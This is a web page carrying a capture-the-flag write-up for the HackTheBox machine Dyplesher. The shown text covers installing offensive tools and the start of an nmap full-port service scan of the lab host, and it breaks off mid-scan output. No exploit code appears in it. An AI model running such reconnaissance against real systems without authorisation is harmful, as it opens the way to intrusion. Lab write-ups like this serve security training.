<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-HackTheBox/Dyplesher/write-up">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Dyplesher | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/HackTheBox/Dyplesher/write-up/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="Dyplesher | CyFun"><meta data-rh="true" name="description" content="- Name: Dyplesher"><meta data-rh="true" property="og:description" content="- Name: Dyplesher"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/HackTheBox/Dyplesher/write-up/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Dyplesher/write-up/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Dyplesher/write-up/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Academy/write-up/">Academy</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Admirer/write-up/">Admirer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blackfield/write-up/">Blackfield</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blunder/write-up/">Blunder</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Book/write-up/">Book</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Buff/write-up/">Buff</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Cache/write-up/">Cache</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Control/write-up/">Control</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/CyberSantaCTF/2021/write-up/">CyberSantaCTF</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Delivery/write-up/">Delivery</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Doctor/write-up/">Doctor</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/writeups/HackTheBox/Dyplesher/write-up/">Dyplesher</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/HackTheBox/Dyplesher/write-up/">Dyplesher </a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Fatty/write-up/">Fatty</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ForwardSlash/write-up/">ForwardSlash</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Jewel/write-up/">Jewel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Laboratory/write-up/">Laboratory</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Magic/write-up/">Magic</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Mango/write-up/">Mango</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Monteverde/write-up/">Monteverde</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Nest/write-up/">Nest</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Obscurity/write-up/">Obscurity</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Omni/write-up/">Omni</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Oouch/write-up/">Oouch</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/OpenAdmin/write-up/">OpenAdmin</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Passage/write-up/">Passage</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Ready/write-up/">Ready</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Remote/write-up/">Remote</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ScriptKiddie/write-up/">ScriptKiddie</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ServMon/write-up/">ServMon</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/SneakyMailer/write-up/">SneakyMailer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tabby/write-up/">Tabby</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tenet/write-up/">Tenet</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traceback/write-up/">Traceback</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Travel/write-up/">Travel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traverxec/write-up/">Traverxec</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Worker/write-up/">Worker</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/Tryhackme/0day/">Tryhackme</a></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HackTheBox</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Dyplesher</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Dyplesher </span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Information</h1><ul><li><strong>Name:</strong> Dyplesher</li><li><strong>Profile:</strong> <a href="https://www.hackthebox.eu/home/machines/profile/253" target="_blank" rel="noopener noreferrer">www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Insane</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 50</li></ul><p><img loading="lazy" alt="Dyplesher" src="/assets/images/dyplesher-c095e4b99b25e4a731d366726f5ec98d.png" width="598" height="381" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview">​</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ pacman -S nmap ffuf gittools ruby haiti john git dbeaver intellij-idea-community-edition ruby-ctf-party radare2 vim gtfoblookup</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>PS: <code>radare2</code> for <code>rax2</code> &amp; <code>vim</code> for <code>xxd</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="network-enumeration">Network enumeration<a href="#network-enumeration" class="hash-link" aria-label="Direct link to Network enumeration" title="Direct link to Network enumeration">​</a></h2><p>Port &amp; service discovery with a <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">nmap</a> scan:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap 7.80 scan initiated Mon Sep 21 21:58:37 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.190</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.10.190</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.023s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 65525 filtered ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT      STATE  SERVICE    VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">22/tcp    open   ssh        OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssh-hostkey:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   3072 7e:ca:81:78:ec:27:8f:50:60:db:79:cf:97:f7:05:c0 (RSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   256 e0:d7:c7:9f:f2:7f:64:0d:40:29:18:e1:a1:a0:37:5e (ECDSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  256 9f:b2:4c:5c:de:44:09:14:ce:4f:57:62:0b:f9:71:81 (ED25519)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">80/tcp    open   http       Apache httpd 2.4.41 ((Ubuntu))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-methods:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Supported Methods: GET HEAD OPTIONS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Dyplesher</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3000/tcp  open   ppp?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| fingerprint-strings:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   GenericLines, Help:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     HTTP/1.1 400 Bad Request</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Content-Type: text/plain; charset=utf-8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Connection: close</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Request</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   GetRequest:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     HTTP/1.0 200 OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Content-Type: text/html; charset=UTF-8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Set-Cookie: i_like_gogs=c5223df8b92fb1ca; Path=/; HttpOnly</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Set-Cookie: _csrf=xX-05aCyGtiJAIiNzxC_DY6TfAo6MTYwMDcxODgyNjM0MjIxNzkyMA%3D%3D; Path=/; Expires=Tue, 22 Sep 2020 20:07:06 GMT; HttpOnly</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Date: Mon, 21 Sep 2020 20:07:06 GMT</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;!DOCTYPE html&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;html&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;head data-suburl=&quot;&quot;&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;/&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta name=&quot;author&quot; content=&quot;Gogs&quot; /&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta name=&quot;description&quot; content=&quot;Gogs is a painless self-hosted Git service&quot; /&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta name=&quot;keywords&quot; content=&quot;go, git, self-hosted, gogs&quot;&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta name=&quot;_csrf&quot; content=&quot;xX-05aCyGtiJAIiNzxC_DY6TfAo6MTYwMDcxODgyNjM0MjIxNzkyMA==&quot; /&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta name=&quot;_suburl&quot; content=&quot;&quot; /&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta proper</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   HTTPOptions:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     